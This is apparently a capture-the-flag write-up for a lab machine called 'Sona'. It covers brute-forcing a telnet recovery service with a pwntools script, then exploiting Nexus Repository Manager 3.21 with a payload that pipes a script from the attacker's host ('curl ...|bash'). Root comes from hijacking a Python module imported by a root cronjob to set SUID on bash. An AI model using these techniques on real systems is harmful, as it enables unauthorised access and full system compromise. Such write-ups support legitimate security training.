# Sona

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.240.159
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 11:22 +08
Nmap scan report for 192.168.240.159
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
23/tcp   open  telnet
8081/tcp open  blackice-icecap
```

### Telnet Creds -> Nexus RCE

Port 8081 was hosting a vulnerable version of Nexus Repository Manager:

<figure><img src="../../../.gitbook/assets/image (3019).png" alt=""><figcaption></figcaption></figure>

This version has RCE exploits, but we need credentials.

```
$ searchsploit nexus 3.21
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticat | java/webapps/49385.py
----------------------------------------------------------- --------------------------------
```

Weak credentials like `admin:admin` or `nexus:nexus` didn't work. In this case, let's check out out Telnet on port 23.&#x20;

```
$ nc -vn 192.168.240.159 23
(UNKNOWN) [192.168.240.159] 23 (telnet) open
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT   Exit
HELP   Show help
HINT   Show hints
RECOVER Recover admin password
RESTORE Restore backup
```

We can somehow recover the password from this. We can interact with this application a bit:

```
HINT
1.What is your zodiac sign?
2.What is your favorite color?
RECOVER
Please Enter Password
RECOVER <password>
ANSONE
Please Enter Answer
ANSONE <answer>
```

I wasn't sure how to get this, so let's use the ANSONE and ANSTWO options to check our options. I made a list of colours and zodiac signs:

{% embed url="https://github.com/imsky/wordlists/blob/master/adjectives/colors.txt" %}

```
capricorn
aquarius
aries
libra
scorpio
virgo
taurus
pisces
gemini
leo
cancer
sagittarius
```

Afterwards, we can create a Python script to brute force out the answer based on this.&#x20;

```python
from pwn import *

def interact(word):
	r = remote('192.168.240.159', 23)
	for i in range(11):
		r.recvline()
	r.sendline(b'ANSONE')
	r.recvline()
	r.recvline()
	r.sendline(word.encode())
	response = r.recvline()
	if b'Incorrect' in response:
		r.close()
	else:
		log.info("Correct!")
		log.info(f"Password is {word}")
		r.close()
		
def main():
	with open ('colours.txt', 'r') as file:
		for line in file:
			interact(line)

main()
```

This would slowly brute force the first answer, which is `black`:

```
$ python3 brute.py
<TRUNCATED>
[+] Opening connection to 192.168.240.159 on port 23: Done
[*] Correct!
[*] Password is black
[*] Closed connection to 192.168.240.159 port 23
```

Now we can do the same for the zodiac signs and ANSTWO.&#x20;

```
[+] Opening connection to 192.168.240.159 on port 23: Done
[*] Correct!
[*] Password is leo
[*] Closed connection to 192.168.240.159 port 23
```

So the correct answers are 'black' and 'leo'. We can create a wordlist with these words, which is just:

```
black
leo
leoblack
blackleo
```

`blackleo` is the correct password:

```
RECOVER
Please Enter Password
RECOVER <password>
blackleo
3e409e89-514c-4f9f-955e-dfa5c4083518
```

Using this, we can run the exploit with these parameters:

```python
URL='http://192.168.240.159:8081'
CMD='curl 192.168.45.216/shell.sh|bash'
USERNAME='admin'
PASSWORD='3e409e89-514c-4f9f-955e-dfa5c4083518'
```

I had a lot of trouble getting a shell on this machine for some reason. Eventually, I just decided to use `msfconsole` to exploit this.&#x20;

<figure><img src="../../../.gitbook/assets/image (3229).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Cronjob -> Python Module Hijack

I ran a `linpeas.sh` scan on the machine and found an interesting permission set:

```
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
<TRUNCATED>
/usr/lib/python3.8
/usr/lib/python3.8/base64.py
```

We can write to `base64.py`, which is the module being used here. I ran `pspy64` as well to see if this file was being executed in anyway.&#x20;

```
2023/07/07 04:19:01 CMD: UID=0    PID=58840  | python3 /home/sona/logcrypt.py 
```

This file was being run every minute:

```
nexus@sona:/etc/cron.d$ cat logcrypt
cat logcrypt
* * * * * root python3 /home/sona/logcrypt.py
```

Within the `/tmp` directory, there was a `log.crypt` file that contained a huge `base64` encoded file:

{% code overflow="wrap" %}
```
nexus@sona:/tmp$ cat log.crypt
cat log.crypt
SnVsICA3IDAzOjI3OjQ1IHNvbmEgVkdBdXRoWzc4OF06IHZtdG9vbHNkOiBVc2VybmFtZSBhbmQgcGFzc3dvcmQgc3VjY2Vzc2Z1bGx5IHZhbGlkYXRlZCBmb3IgJ3Jvb3QnLgpKdWwgIDcgMDM6Mjc6NDYgc29uYSBWR0F1dGhbNzg4XTogbWVzc2FnZSByZXBlYXRlZCAyIHRpbWVzOiBbIHZtdG9vbHNkOiBVc2VybmFtZSBhbmQgcGFzc3dvcmQgc3VjY2Vzc2Z1bGx5IHZhbGlkYXRlZCBmb3IgJ3Jvb3QnLl0KSnVsICA3IDAzOjI3OjUxIHNvbmEgVkdBdXRoWzc4
<TRUNCATED>
```
{% endcode %}

The file was also owned by `root`, meaning that this likely being generated by the `logcrypt` cronjob. I just echoed in `import os;os.system("chmod u+s /bin/bash")` within the `base64.py` file and it worked!

```
nexus@sona:/usr/lib/python3.8$ ls -al /bin/bash
ls -al /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

<figure><img src="../../../.gitbook/assets/image (1619).png" alt=""><figcaption></figcaption></figure>
